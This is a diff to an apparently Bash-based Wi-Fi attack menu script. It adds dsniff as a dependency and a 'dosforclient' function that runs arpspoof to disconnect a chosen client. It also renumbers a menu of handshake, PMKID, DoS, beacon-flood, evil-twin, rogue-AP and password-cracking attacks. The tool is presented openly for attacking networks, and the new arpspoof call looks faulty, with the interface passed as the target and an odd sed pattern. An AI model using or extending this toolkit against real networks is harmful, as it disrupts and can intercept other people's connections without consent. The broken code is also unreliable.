@@ -46,7 +46,7 @@ fedora=$(echo $?)
 #On the basis of the distribution, download the dependencies 
 programs() {
 	
-	dependencias=(aircrack-ng xterm hashcat nmap hcxtools hcxdumptool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin)
+	dependencias=(aircrack-ng xterm hashcat nmap hcxtools hcxdumptool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin dsniff)
 	
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
@@ -463,9 +463,20 @@ modeagain () {
 	modeverification
 }
 
+dosforclient () {
+	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting DoS for client..."
+	reconnect
+	echo -ne "${yellowColour}[?]$grayColour Network you want to attack?: " && read redattackdos
+	sleep 2
+	echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect: " && read clientattackdos
+	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\x\)$/1/g')
+	xterm -hold -e "arpspoof -i "$redattackdos" -t "$redattackdos" "$ipnew"" &
+	modeagain
+}
+
 #[5] local network scanner with ip with nmap
 scanner() {
-	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting Scanner"
+	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting Scanner..."
 	reconnect
 	tput cnorm; echo -ne "$blueColour[?]$grayColour Local Network IP (192.168.1.0): " && read iplocal
 	tput civis; echo -e "\n---------------------------------------------------\n"
@@ -799,12 +810,13 @@ banner() {
 bannermainattack() {
 	bannerattack
 	echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Fake Access Point\t\t${turquoiseColour}[+]${grayColour} Cracking password"
-	echo -e "${yellowColour}\n[1] Handshake Attack\t\t[7] Wifiphisher/Evil Twin\t[9] Force Brute .cap"
-	echo -e "[2] PMKID Attack\t\t[8] Fake/Rogue AP\t\t[10] Hash .cap -> .hccapx"
-	echo -e "[3] DoS Attack\t\t\t\t\t\t\t[11] Hashed Dictionary (Rainbow tables)"
-	echo -e "[4] Beacon Flood Attack\t\t\t\t\t\t[12] Force Brute with GPU"
+	echo -e "${yellowColour}\n[1] Handshake Attack\t\t[8] Wifiphisher/Evil Twin\t[10] Force Brute .cap"
+	echo -e "[2] PMKID Attack\t\t[9] Fake/Rogue AP\t\t[11] Hash .cap -> .hccapx"
+	echo -e "[3] DoS Attack\t\t\t\t\t\t\t[12] Hashed Dictionary (Rainbow tables)"
+	echo -e "[4] Beacon Flood Attack\t\t\t\t\t\t[13] Force Brute with GPU"
 	echo -e "[5] Network traffic"
 	echo -e "[6] Scanner"
+	echo -e "[7] DoS Attack for Client"
 	echo -e "\n[99] Exit and restart the network card\n"
 	tput cnorm
 	echo -ne "${blueColour}[?]${grayColour} Attack: " && read opcion
@@ -829,21 +841,24 @@ bannermainattack() {
 		scanner
 		;;
 		7)
-		ntwkphishing
+		dosforclient
 		;;
 		8)
-		fakeap
+		ntwkphishing
 		;;
 		9)
-		fuerza_.cap
+		fakeap
 		;;
 		10)
-		caphccapx
+		fuerza_.cap
 		;;
 		11)
-		rainbowtaibles
+		caphccapx
 		;;
 		12)
+		rainbowtaibles
+		;;
+		13)
 		gpuhash
 		;;
 		99)
